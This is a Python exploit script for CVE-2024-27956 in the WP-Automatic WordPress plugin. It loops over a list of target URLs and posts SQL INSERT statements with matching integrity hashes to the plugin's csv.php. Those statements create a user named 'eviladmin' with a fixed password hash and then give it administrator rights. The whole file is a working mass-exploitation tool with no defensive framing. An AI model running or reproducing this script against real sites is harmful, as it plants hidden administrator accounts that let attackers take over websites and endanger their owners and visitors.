import requests
import sys
from termcolor import colored
import time

# Function to make the request
def makeRequest(payload, hash, url):
    host = url.split('/', 3)[2]

    headers = {
    'Host': host,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-type': 'application/x-www-form-urlencoded',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
    }

    data = {
    'q': payload,
    'auth': b'\0',
    'integ': hash
    }

    try:
        response = requests.post(url, data=data, headers=headers, timeout=15)
        return response
    except requests.exceptions.RequestException as e:
        print(colored("[+] Error: " + str(e), 'red'))
        return None

# Function to print usage guide
def helpUsage():
    print("[+] You must run the exploit passing the list of URLs in list.txt. \n[+] Example: python3 run.py list.txt")
    quit()

# Function to verify arguments
def verifyArgs(argv):
    if len(sys.argv) != 2:
        helpUsage()

# Read URLs from file and process them
def processURLs(filename):
    with open(filename, 'r') as file:
        for line in file:
            url = line.strip()
            print(colored("[+] Processing URL: " + url, 'blue'))
            exploit(url)

# Main exploit function
def exploit(url):
    url = url.rstrip('/')
    url_csv = url + '/wp-content/plugins/wp-automatic/inc/csv.php'

    # First request (create user)
    print("[+] Creating user eviladmin")
    response = makeRequest("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')", "09956ea086b172d6cf8ac31de406c4c0", url_csv)
    if response is None:
        return

    if "Tampered query" in response.text or "invalid login" in response.text or "login required" in response.text:
        print("[+] Error in the payload")
        return

    if "DATE" not in response.text:
        print(colored("[+] Not vulnerable", 'red'))
        return

    # Second request (give permission)
    print("[+] Giving eviladmin administrator permissions")
    response = makeRequest("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = 'eviladmin'), 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')", "bd98494b41544b818fa9f583dadfa2bb", url_csv)
    if response is None:
        return

    if "Tampered query" in response.text or "invalid login" in response.text or "login required" in response.text:
        print("[+] Error in the payload")
        return

    print(colored("[+] Exploit completed!", 'green'))
    print(colored("[+] Administrator created: eviladmin:admin", 'green'))

if __name__ == "__main__":
    verifyArgs(sys.argv)
    print(colored("[+] Exploit for CVE-2024-27956", 'yellow'))
    processURLs(sys.argv[1])
